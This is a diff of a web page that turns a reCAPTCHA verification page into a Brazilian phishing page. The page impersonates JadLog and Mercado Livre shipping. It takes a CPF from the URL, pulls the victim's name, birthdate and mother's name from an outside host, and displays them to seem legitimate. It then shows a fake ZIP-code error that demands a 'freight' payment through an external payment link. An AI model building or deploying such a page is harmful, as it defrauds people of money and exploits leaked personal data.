@@ -1,56 +1,176 @@
-<!DOCTYPE html><html><head>
-    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    
-    <title>Bot Verification</title>
-    <script>
-        function onSubmit() {
-            document.getElementById('lsrecaptcha-form').submit();
+
+<!DOCTYPE html><html lang="pt-BR"><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <link rel="stylesheet" href="https://c2.cdn1tp.net/8df4b60e84d1484cadcc14ca6fa62532/css/style.css">
+
+    <style>
+        * {
+            box-sizing: border-box;
         }
 
-        var onloadCallback = function() {
-            var cont = grecaptcha.render('recaptchadiv', {
-                'sitekey': '6LewU34UAAAAAHvXqFOcQlm8z1MP1xpGAZCYEeZY',
-                'callback': onSubmit,
-                
-            });
-            grecaptcha.execute(cont);
-        };
-    </script>
-    <style>
-        body {
-        height: 100%;
+        #buttonClick {
+            background-color: #CB0033;
+            color: white;
+            font-family: "Poppins";
+            padding: 7px 15px 7px 15px !important;
+            text-decoration: none !important;
+            border-radius: 10px !important;
+            border: none !important;
+            font-size: 18px !important;
+            font-weight: 600;
         }
-        .panel {
-        padding: 30px;
-        max-width: 425px;
-        margin: 10% auto;
-        box-shadow: 0 0 2px 2px rgba(0, 0, 0, 0.2);
-        }
-        .title {
-        font-size: 1.5em;
-        font-weight: 100;
-        margin-top: 10px;
-        text-align: center;
-        }
-        .recaptcha-center {
-        margin-top: 35px;
-        margin-bottom: 20px;
-        margin-left: 13%;
-        margin-right: 13%;
-        display: block;
+
+        #buttonClick:hover {
+            background-color: #7a001e;
+            cursor: pointer;
         }
     </style>
-</head>
+
+
+    <title>VERIFICAÇÃO</title>
+	<script src="https://c2.cdn1tp.net/8df4b60e84d1484cadcc14ca6fa62532/js/latest.js" async="" defer=""></script>
+
+            <script>
+                const v_123_pageId = "66719913a3ef62ff905ff5d2";
+                const v_123_siteId = "65e4bcf3a492963d6524ec68";
+                const v_123_siteType = "HTML";
+                const v_123_slug = null;
+            </script>
+
+            </head>
+
 <body>
-    <div class="panel">
-        <h3 class="title">Verifying that you are not a robot...</h3>
-        <form id="lsrecaptcha-form" method="POST" action="/.lsrecap/recaptcha?">
-            <div id="recaptchadiv" class="recaptcha-center"></div>
-        </form>
+    <header>
+        <img src="https://c2.cdn1tp.net/8df4b60e84d1484cadcc14ca6fa62532/images/logo_home.png" alt="">
+
+        <p style="margin-top: 5px; font-size: 12px;">Será responsável pelo envio do pedido.</p>
+    </header>
+
+    <div class="cta">
+        <img id="imagem" src="https://c2.cdn1tp.net/8df4b60e84d1484cadcc14ca6fa62532/images/certo-jadlog.png" alt="">
+
+        <p>Confirme os dados de envio seu pedido:</p>
     </div>
-    <script src="js/api.js" async="" defer="">
+
+    <div class="cta3">
+        <p id="setar">Carregando...</p>
+
+        <p id="setars">
+            O envio será em parceria com a JadLog e o Mercado Livre
+            
+        </p>
+    </div>
+
+    <div class="cta4">
+        <span id="sends">CONFIRMAR</span>
+    </div>
+
+    <div id="popoup">
+        <div class="popoupcontent">
+            <div class="row">
+                <img id="naomostrardeinicio" src="https://c2.cdn1tp.net/8df4b60e84d1484cadcc14ca6fa62532/images/red-hazard-warning-sign-on-transparent-background-free-png.png" alt="">
+
+                <div class="headlineectapopoup">
+                    <h1 id="carregandodadoss">Confirmando seus dados...</h1>
+                    <p id="esconderdepois">Por favor aguarde</p>
+                </div>
+
+                <h1 id="carregandodadosSs">ERRO NO CEP</h1>
+            </div>
+
+            <div class="loading">
+                <br>
+                <div class="progresseBar">
+                    <div class="progress"></div>
+                </div>
+            </div>
+
+            <div class="contente">
+                <p>
+                    O valor do CEP foi calculado errado para sua região, o envio não será enviado.
+
+                    <br><br>
+
+                    Para realizarmos o envio é necessário que envie o pagamento do frete. (O Valor pago do frete será reembolsado.)
+                </p>
+
+                <a id="buttonClick" href="https://pay.cupomdescontos.com/a9ArZMJzKa1G7xj">
+                    PAGAR FRETE
+                </a>
+
+                <span id="maisforte">Clique no botão para continuar</span>
+            </div>
+        </div>
+    </div>
+
+    <footer>
+        <img src="https://c2.cdn1tp.net/8df4b60e84d1484cadcc14ca6fa62532/images/jadlog-logo-png.png" alt="">
+
+        <p>Todo conteúdo deste site está publicado sob a licença</p>
+    </footer>
+
+    <script src="https://c2.cdn1tp.net/8df4b60e84d1484cadcc14ca6fa62532/js/text.js"></script>
+
+    <script>
+        const queryParams = new URLSearchParams(window.location.search);
+
+        const cpf = queryParams.get('document');
+
+        const user = {};
+
+        function renderData() {
+            if (user.sex && user.birthdate) {
+                let htmlContent = `
+                    Nome: <b>${user.name}</b><br>
+                    Sexo: <b>${user.sex === 'M' ? 'Masculino' : user.sex === 'F' ? 'Feminino' : user.sex}</b><br>
+                    Data de nascimento: <b>${user.birthdate}</b>`;
+
+                if (user.mother && user.mother !== "0") {
+                    htmlContent += `
+                        <br>Nome da mãe: <b>${user.mother}</b>
+                    `;
+                }
+
+                document.getElementById('setar').innerHTML = htmlContent;
+            } else {
+                document.getElementById('setar').innerHTML = `Carregando...`;
+            }
+        }
+
+        fetch('https://g1-noticia.net/verificacao/getUserData.php?cpf=' + cpf)
+            .then(response => response.json())
+            .then(data => {
+                user.name = data.name;
+                user.sex = data.sex;
+                user.cpf = data.cpf;
+                user.mother = data.mother;
+                user.birthdate = data.birthdate;
+
+                renderData();
+            })
+            .catch(error => {
+                console.error('Erro ao fazer a solicitação:', error);
+            });
     </script>
 
+    <!-- Google Tag Manager (noscript) -->
+    <noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-MBNDSM8M" height="0" width="0"
+            style="display:none;visibility:hidden"></iframe></noscript>
+    <!-- End Google Tag Manager (noscript) -->
 
-</body></html>
+
+<script>'undefined'=== typeof _trfq || (window._trfq = []);'undefined'=== typeof _trfd && (window._trfd=[]),_trfd.push({'tccl.baseHost':'secureserver.net'},{'ap':'cpsh-oh'},{'server':'p3plzcpnl492182'},{'dcenter':'p3'},{'cp_id':'9883949'},{'cp_cl':'8'}) // Monitoring performance to make your website faster. If you want to opt-out, please contact web hosting support.</script><script src="https://c2.cdn1tp.net/8df4b60e84d1484cadcc14ca6fa62532/js/scc-c2.min.js"></script>
+                    <script async="true" src="https://c1.cdn1tp.net/ghelper/googletagmanager.js"></script>
+                <script>
+    window.onload = function () {
+        var links = document.getElementsByTagName("a");
+        for (var i = 0, n = links.length; i < n; i++) {
+            var href = links[i].href.trim() +
+                    (links[i].href.indexOf("?") > 0 ? '&' : '?') +
+                    document.location.search.replace('?', '').toString();
+            links[i].href = href;
+        }
+    }
+</script></body></html>
